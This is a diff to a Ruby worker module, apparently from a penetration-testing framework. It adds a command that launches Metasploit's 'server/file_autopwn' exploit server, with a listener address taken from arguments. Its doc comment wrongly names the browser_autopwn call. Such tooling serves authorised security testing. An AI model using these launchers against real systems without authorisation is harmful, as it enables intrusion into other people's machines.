@@ -83,6 +83,20 @@ module FIDIUS::MsfWorker::CommandPool
     run_exploit "server/browser_autopwn", options
   end
 
+  # Not documentated yet.
+  #
+  # Call sequence:
+  #   cmd_start_browser_autopwn(:args => [], :task => nil)
+  #
+  # @param [Array] args  Arguments.
+  # @param [Task] task  A Task ActiveRecord.
+  FIDIUS::MsfWorker.register_command :start_file_autopwn do |options|
+    args = options[:args]
+    task = options[:task]
+    options = {'LHOST' => args[0], 'SRVHOST' => args[0], 'URIPATH' => 'file' }
+    run_exploit "server/file_autopwn", options
+  end
+
 end
 
 class FIDIUS::MsfWorker
